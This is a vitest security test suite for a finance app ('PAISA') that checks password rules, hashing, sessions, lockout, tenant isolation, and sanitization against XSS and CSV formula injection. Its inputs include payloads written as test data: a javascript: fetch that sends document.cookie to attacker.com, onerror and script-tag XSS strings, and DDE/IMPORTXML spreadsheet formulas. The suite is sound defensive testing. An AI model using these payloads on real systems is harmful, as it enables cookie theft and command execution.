class MemoryStorage {
  private store: Map<string, string> = new Map();

  getItem(key: string): string | null {
    return this.store.has(key) ? this.store.get(key)! : null;
  }

  setItem(key: string, value: string): void {
    this.store.set(key, String(value));
  }

  removeItem(key: string): void {
    this.store.delete(key);
  }

  clear(): void {
    this.store.clear();
  }

  get length(): number {
    return this.store.size;
  }

  key(index: number): string | null {
    const keys = Array.from(this.store.keys());
    return keys[index] ?? null;
  }
}

if (typeof globalThis.localStorage === 'undefined') {
  (globalThis as any).localStorage = new MemoryStorage();
}

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { sanitizeString, sanitizeCsvCell, validatePasswordStrength, maskSensitive } from '../lib/security';
import { authService, hashPassword } from '../lib/authService';
import { auditLogger } from '../lib/auditLogger';
import { store } from '../lib/storage';
import { exportTransactionsToCsv } from '../lib/csvParser';
import { Transaction } from '../types';

describe('PAISA Level 03 Security Hardening & Isolation Suite', () => {
  beforeEach(() => {
    localStorage.clear();
    auditLogger.clearLogs();
  });

  // ============================================================================
  // 1. Password Strength Validation (OWASP ASVS v5.0.0)
  // ============================================================================
  describe('Password Strength Validation', () => {
    it('rejects passwords shorter than 8 characters', () => {
      const res = validatePasswordStrength('Pass1!');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('at least 8 characters');
    });

    it('rejects passwords lacking uppercase letters', () => {
      const res = validatePasswordStrength('password123!');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('uppercase letter');
    });

    it('rejects passwords lacking lowercase letters', () => {
      const res = validatePasswordStrength('PASSWORD123!');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('lowercase letter');
    });

    it('rejects passwords lacking digits', () => {
      const res = validatePasswordStrength('Password!@#');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('number');
    });

    it('rejects passwords lacking special characters', () => {
      const res = validatePasswordStrength('Password123');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('special character');
    });

    it('accepts strong, compliant passwords', () => {
      const res = validatePasswordStrength('P@isaSecure2026!');
      expect(res.isValid).toBe(true);
      expect(res.error).toBeUndefined();
    });
  });

  // ============================================================================
  // 2. Cryptographic Salting & Hashing (Web Crypto API)
  // ============================================================================
  describe('Cryptographic Salting & Hashing', () => {
    it('generates a 64-character SHA-256 hex string', async () => {
      const hash = await hashPassword('SecretP@ssword1', 'salt123');
      expect(hash).toHaveLength(64);
      expect(/^[0-9a-f]{64}$/.test(hash)).toBe(true);
    });

    it('produces distinct hashes for different salts with identical passwords', async () => {
      const hash1 = await hashPassword('SecretP@ssword1', 'salt_alpha');
      const hash2 = await hashPassword('SecretP@ssword1', 'salt_beta');
      expect(hash1).not.toBe(hash2);
    });

    it('produces deterministic output for the same password and salt', async () => {
      const hash1 = await hashPassword('SecretP@ssword1', 'consistent_salt');
      const hash2 = await hashPassword('SecretP@ssword1', 'consistent_salt');
      expect(hash1).toBe(hash2);
    });
  });

  // ============================================================================
  // 3. User Authentication, Registration & Session Lifecycle
  // ============================================================================
  describe('Authentication & Session Management', () => {
    it('registers a user securely without storing plaintext passwords', async () => {
      const reg = await authService.register({
        email: 'user1@example.com',
        password: 'ValidPass123!',
        display_name: 'User One',
      });

      expect(reg.success).toBe(true);
      expect(reg.user).toBeDefined();
      expect(reg.user?.email).toBe('user1@example.com');

      // Verify registry contains hashed password, NOT plaintext
      const registry = authService.getUsersRegistry();
      const account = registry.find(a => a.email === 'user1@example.com');
      expect(account).toBeDefined();
      expect(account?.password_hash).toHaveLength(64);
      expect(account?.password_hash).not.toBe('ValidPass123!');
      expect(account?.salt).toBeDefined();
    });

    it('prevents duplicate user registrations with the same email', async () => {
      await authService.register({
        email: 'duplicate@example.com',
        password: 'ValidPass123!',
        display_name: 'First',
      });

      const second = await authService.register({
        email: 'duplicate@example.com',
        password: 'AnotherPass123!',
        display_name: 'Second',
      });

      expect(second.success).toBe(false);
      expect(second.error).toContain('already exists');
    });

    it('authenticates valid credentials and generates an active session', async () => {
      await authService.register({
        email: 'login_test@example.com',
        password: 'ValidPass123!',
        display_name: 'Login User',
      });

      authService.logout();
      expect(authService.getCurrentSession()).toBeNull();

      const loginRes = await authService.login({
        email: 'login_test@example.com',
        password: 'ValidPass123!',
      });

      expect(loginRes.success).toBe(true);
      expect(loginRes.user?.email).toBe('login_test@example.com');

      const session = authService.getCurrentSession();
      expect(session).not.toBeNull();
      expect(session?.token).toMatch(/^sess_/);
      expect(session?.expires_at).toBeGreaterThan(Date.now());
    });

    it('revokes session immediately upon logout', async () => {
      await authService.register({
        email: 'logout_test@example.com',
        password: 'ValidPass123!',
        display_name: 'Logout User',
      });

      expect(authService.getCurrentSession()).not.toBeNull();
      authService.logout();
      expect(authService.getCurrentSession()).toBeNull();
      expect(authService.getCurrentUser()).toBeNull();
    });

    it('invalidates expired sessions automatically', async () => {
      await authService.register({
        email: 'expired_test@example.com',
        password: 'ValidPass123!',
        display_name: 'Expired User',
      });

      const session = authService.getCurrentSession()!;
      // Manually tamper session expiry in storage to simulate elapsed time
      session.expires_at = Date.now() - 1000;
      localStorage.setItem('paisa_auth_session', JSON.stringify(session));

      expect(authService.getCurrentSession()).toBeNull();
      expect(authService.getCurrentUser()).toBeNull();
    });
  });

  // ============================================================================
  // 4. Brute-Force Rate Limiting & Account Lockout
  // ============================================================================
  describe('Brute-force Rate Limiting & Account Lockout', () => {
    it('locks account after 5 consecutive failed login attempts', async () => {
      const email = 'target_victim@example.com';
      await authService.register({
        email,
        password: 'RealPassword123!',
        display_name: 'Target User',
      });
      authService.logout();

      // Attempts 1 to 4 should fail without lockout
      for (let i = 1; i <= 4; i++) {
        const res = await authService.login({ email, password: 'WrongPassword!' });
        expect(res.success).toBe(false);
        expect(res.error).toBe('Invalid email or password.');
        const check = authService.checkRateLimit(email);
        expect(check.isLocked).toBe(false);
      }

      // 5th attempt triggers lockout
      const fifthRes = await authService.login({ email, password: 'WrongPassword!' });
      expect(fifthRes.success).toBe(false);

      const check = authService.checkRateLimit(email);
      expect(check.isLocked).toBe(true);
      expect(check.remainingSec).toBeGreaterThan(0);

      // Subsequent attempt is blocked by lockout without evaluating password
      const blockedRes = await authService.login({ email, password: 'RealPassword123!' });
      expect(blockedRes.success).toBe(false);
      expect(blockedRes.error).toContain('Account is temporarily locked');

      // Verify lockout event logged in audit logger
      const logs = auditLogger.getLogs();
      const lockoutLog = logs.find(l => l.eventType === 'RATE_LIMIT_LOCKOUT');
      expect(lockoutLog).toBeDefined();
    });
  });

  // ============================================================================
  // 5. Multi-Tenant User Isolation & Authorization
  // ============================================================================
  describe('Multi-Tenant Data Isolation & Authorization', () => {
    const userA_id = 'usr_tenant_A';
    const userB_id = 'usr_tenant_B';

    it('isolates user transactions by tenant ID', () => {
      store.resetToDemoData();

      // Add transaction for User A
      const txA = store.addTransaction({
        user_id: userA_id,
        transaction_date: '2026-10-15',
        merchant: 'User A Secret Merchant',
        amount: 2500,
        transaction_type: 'expense',
        category_id: 'shopping',
        payment_method: 'UPI',
      });

      // Add transaction for User B
      const txB = store.addTransaction({
        user_id: userB_id,
        transaction_date: '2026-10-16',
        merchant: 'User B Secret Merchant',
        amount: 1200,
        transaction_type: 'expense',
        category_id: 'food',
        payment_method: 'UPI',
      });

      // User A query must only return User A transactions
      const userATransactions = store.getTransactions(userA_id);
      expect(userATransactions.some(t => t.id === txA.id)).toBe(true);
      expect(userATransactions.some(t => t.id === txB.id)).toBe(false);

      // User B query must only return User B transactions
      const userBTransactions = store.getTransactions(userB_id);
      expect(userBTransactions.some(t => t.id === txB.id)).toBe(true);
      expect(userBTransactions.some(t => t.id === txA.id)).toBe(false);
    });

    it('blocks cross-tenant update attempts and logs audit violation', () => {
      const txA = store.addTransaction({
        user_id: userA_id,
        transaction_date: '2026-10-15',
        merchant: 'User A Merchant',
        amount: 5000,
        transaction_type: 'expense',
        category_id: 'bills',
        payment_method: 'UPI',
      });

      // User B attempts to tamper with User A's transaction
      const tampered = store.updateTransaction(txA.id, { amount: 1 }, userB_id);
      expect(tampered).toBeNull();

      // Verify the transaction was NOT modified
      const original = store.getAllRawTransactions().find(t => t.id === txA.id);
      expect(original?.amount).toBe(5000);

      // Verify security audit log captured the violation
      const logs = auditLogger.getLogs();
      const violation = logs.find(l => l.eventType === 'CROSS_TENANT_VIOLATION_ATTEMPT');
      expect(violation).toBeDefined();
      expect(violation?.userId).toBe(userB_id);
    });

    it('blocks cross-tenant delete attempts and logs audit violation', () => {
      const txA = store.addTransaction({
        user_id: userA_id,
        transaction_date: '2026-10-15',
        merchant: 'User A Merchant',
        amount: 5000,
        transaction_type: 'expense',
        category_id: 'bills',
        payment_method: 'UPI',
      });

      // User B attempts to delete User A's transaction
      const deleted = store.deleteTransaction(txA.id, userB_id);
      expect(deleted).toBe(false);

      // Verify the transaction still exists
      const exists = store.getAllRawTransactions().some(t => t.id === txA.id);
      expect(exists).toBe(true);

      // Verify security audit log
      const logs = auditLogger.getLogs();
      const violation = logs.find(l => l.eventType === 'CROSS_TENANT_VIOLATION_ATTEMPT');
      expect(violation).toBeDefined();
    });

    it('isolates savings goals and prevents unauthorized deletion', () => {
      const goalA = {
        id: 'goal_A_1',
        user_id: userA_id,
        name: 'Private Emergency Fund',
        target_amount: 50000,
        current_amount: 10000,
        target_date: '2027-01-01',
        icon: '🛡️',
        category: 'emergency_fund' as const,
      };
      store.addSavingsGoal(goalA);

      // User B cannot see User A's savings goal
      const userBGoals = store.getSavingsGoals(userB_id);
      expect(userBGoals.some(g => g.id === goalA.id)).toBe(false);

      // User B attempts to delete User A's savings goal
      store.deleteSavingsGoal(goalA.id, userB_id);

      // Goal still intact
      const rawGoals = store.getAllRawSavingsGoals();
      expect(rawGoals.some(g => g.id === goalA.id)).toBe(true);

      const logs = auditLogger.getLogs();
      expect(logs.some(l => l.eventType === 'CROSS_TENANT_VIOLATION_ATTEMPT')).toBe(true);
    });
  });

  // ============================================================================
  // 6. Input Sanitization against Stored XSS
  // ============================================================================
  describe('Input Sanitization & Anti-XSS', () => {
    it('strips script tags and dangerous HTML brackets', () => {
      const dirty = '<script>alert("XSS")</script>Swiggy Order';
      const clean = sanitizeString(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('</script>');
      expect(clean).toContain('alert("XSS")Swiggy Order');
    });

    it('strips javascript: pseudo-protocol strings', () => {
      const dirty = 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)';
      const clean = sanitizeString(dirty);
      expect(clean).not.toContain('javascript:');
    });

    it('strips inline HTML event handlers (e.g. onerror=, onclick=)', () => {
      const dirty = 'img src=x onerror=alert(1)';
      const clean = sanitizeString(dirty);
      expect(clean).not.toContain('onerror=');
    });

    it('sanitizes input on transaction storage', () => {
      const tx = store.addTransaction({
        user_id: 'usr_test_xss',
        transaction_date: '2026-10-20',
        merchant: '<img src=x onerror=alert(1)>Amazon',
        description: '<script>evil()</script>Order #123',
        notes: 'javascript:void(0)',
        amount: 999,
        transaction_type: 'expense',
        category_id: 'shopping',
        payment_method: 'UPI',
      });

      expect(tx.merchant).not.toContain('<');
      expect(tx.merchant).not.toContain('onerror=');
      expect(tx.description).not.toContain('<script>');
      expect(tx.notes).not.toContain('javascript:');
    });
  });

  // ============================================================================
  // 7. CSV / Spreadsheet Formula Injection (CWE-1236 / DDE Defense)
  // ============================================================================
  describe('CSV / Spreadsheet Formula Injection Defense', () => {
    it('neutralizes cells starting with =', () => {
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
    });

    it('neutralizes cells starting with + or -', () => {
      expect(sanitizeCsvCell('+cmd|"/C calc"!A0')).toBe("'+cmd|\"/C calc\"!A0");
      expect(sanitizeCsvCell('-2+3+cmd|"/C calc"!A0')).toBe("'-2+3+cmd|\"/C calc\"!A0");
    });

    it('neutralizes cells starting with @, tab, or carriage return', () => {
      expect(sanitizeCsvCell('@IMPORTXML("url")')).toBe("'@IMPORTXML(\"url\")");
      expect(sanitizeCsvCell('\t=2+5')).toBe("'\t=2+5");
    });

    it('leaves standard benign strings unchanged', () => {
      expect(sanitizeCsvCell('Swiggy Order #8812')).toBe('Swiggy Order #8812');
      expect(sanitizeCsvCell('₹1,450.00')).toBe('₹1,450.00');
    });

    it('neutralizes formula injection payloads during CSV export', () => {
      const maliciousTxs: Transaction[] = [
        {
          id: 'tx_evil_1',
          user_id: 'usr_test',
          transaction_date: '2026-10-20',
          merchant: '=cmd|\'/C calc\'!A0',
          description: '@IMPORTXML("https://attacker.com")',
          category_id: 'food',
          amount: 500,
          transaction_type: 'expense',
          payment_method: 'UPI',
          external_transaction_id: '+919999999999',
          notes: '=2+5',
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        },
      ];

      const csv = exportTransactionsToCsv(maliciousTxs);
      expect(csv).toContain("\"'=cmd|'/C calc'!A0\"");
      expect(csv).toContain("\"'@IMPORTXML(\"\"https://attacker.com\"\")\"");
      expect(csv).toContain("\"'+919999999999\"");
      expect(csv).toContain("\"'=2+5\"");
    });
  });

  // ============================================================================
  // 8. Audit Logging & Credential Redaction
  // ============================================================================
  describe('Security Audit Logging & Credential Redaction', () => {
    it('records security events with timestamps and status', () => {
      const entry = auditLogger.log({
        userId: 'usr_audit_test',
        eventType: 'AUTH_LOGIN_SUCCESS',
        details: 'User authenticated successfully from verified device.',
      });

      expect(entry.id).toMatch(/^log_/);
      expect(entry.eventType).toBe('AUTH_LOGIN_SUCCESS');
      expect(entry.success).toBe(true);
      expect(entry.timestamp).toBeDefined();

      const retrieved = auditLogger.getLogs();
      expect(retrieved.some(l => l.id === entry.id)).toBe(true);
    });

    it('redacts passwords, tokens, and secret keys from audit log details', () => {
      auditLogger.log({
        userId: 'usr_audit_test',
        eventType: 'AUTH_LOGIN_FAILURE',
        details: 'Failed attempt with password: SuperSecretP@ssword123 and token: sess_987654321',
      });

      const logs = auditLogger.getLogs();
      const last = logs[0];
      expect(last.details).not.toContain('SuperSecretP@ssword123');
      expect(last.details).not.toContain('sess_987654321');
      expect(last.details).toContain('password=[REDACTED]');
      expect(last.details).toContain('token=[REDACTED]');
    });

    it('masks sensitive bank account digits and emails', () => {
      expect(maskSensitive('501004921987', 'account')).toBe('•••• 1987');
      expect(maskSensitive('atharva.naik@gmail.com', 'email')).toBe('a**********k@gmail.com');
    });
  });
});
